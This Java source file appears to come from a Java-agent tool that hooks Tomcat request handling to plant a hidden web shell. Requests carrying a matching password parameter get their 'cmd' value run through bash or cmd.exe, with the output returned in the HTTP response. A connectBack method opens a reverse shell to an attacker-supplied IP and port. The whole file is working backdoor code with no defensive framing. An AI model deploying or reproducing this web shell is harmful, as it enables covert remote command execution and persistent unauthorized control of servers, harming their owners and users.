package cn.com.x1001.hook;

import cn.com.x1001.Agent;
import cn.com.x1001.http.CoyoteRequest;
import cn.com.x1001.http.HttpResponse;

import java.io.*;
import java.net.Socket;


public class ShellChecker {
    public static void check(Object[] args, Object o) {
        //获取response对象
        HttpResponse httpResponse = new HttpResponse(args[1]);
        Object request = httpResponse.getRequest();
        if (request == null) request = args[0];
        CoyoteRequest coyoteRequest = new CoyoteRequest(request);
        String psw = coyoteRequest.getParameter("psw");
        String c = coyoteRequest.getParameter("cmd");
        if (psw == null || !psw.equals(Agent.password)) {
            return;
        }
        if (c != null) {
            String cmd;
            try {
                cmd = execute(c);
            } catch (Exception e) {
                cmd = e.getMessage();
            }
            httpResponse.write(cmd);
        }
        String ip = coyoteRequest.getParameter("ip");
        String port = coyoteRequest.getParameter("port");
        if (ip == null || port == null) return;
        try {
            String result = connectBack(ip, port);
            httpResponse.write(result);

        } catch (Exception e) {
            httpResponse.write(e.getMessage());
        }

    }

    public static String execute(String cmd) throws Exception {
        StringBuilder result = new StringBuilder();
        if (cmd == null || cmd.length() == 0) {
            return result.toString();
        }
        DataInputStream dis = null;
        InputStream in = null;
        String osName = System.getProperty("os.name").toLowerCase();
        ProcessBuilder processBuilder;
        try {
            if (osName.contains("windows")) {
                processBuilder = new ProcessBuilder("cmd", "/c", cmd);
            } else {
                processBuilder = new ProcessBuilder("/bin/bash","-c", cmd);
            }
            Process process = processBuilder.start();
            in = process.getInputStream();
            dis = new DataInputStream(in);
            String disr = dis.readLine();
            result.append("<pre>");
            while (disr != null) {
                result.append(disr).append("\n");
                disr = dis.readLine();
            }
            result.append("</pre>");

        } finally {
            if (in != null) in.close();
            if (dis != null) dis.close();
        }


        return result.toString();
    }

    public static String connectBack(String ip, String port) throws Exception {
        class StreamConnector extends Thread {
            InputStream sp;
            OutputStream gh;

            StreamConnector(InputStream sp, OutputStream gh) {
                this.sp = sp;
                this.gh = gh;
            }

            public void run() {
                BufferedReader xp = null;
                BufferedWriter ydg = null;
                try {
                    xp = new BufferedReader(new InputStreamReader(this.sp));
                    ydg = new BufferedWriter(new OutputStreamWriter(this.gh));
                    char[] buffer = new char[8192];
                    int length;
                    while ((length = xp.read(buffer, 0, buffer.length)) > 0) {
                        ydg.write(buffer, 0, length);
                        ydg.flush();
                    }
                } catch (Exception ignored) {
                }
                try {
                    if (xp != null)
                        xp.close();
                    if (ydg != null)
                        ydg.close();
                } catch (Exception ignored) {
                }
            }
        }

        String ShellPath;
        if (!System.getProperty("os.name").toLowerCase().contains("windows")) {
            ShellPath = "/bin/sh";
        } else {
            ShellPath = "cmd.exe";
        }

        Socket socket = new Socket(ip, Integer.parseInt(port));
        Process process = Runtime.getRuntime().exec(ShellPath);
        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
        return "Successful!";

    }
}
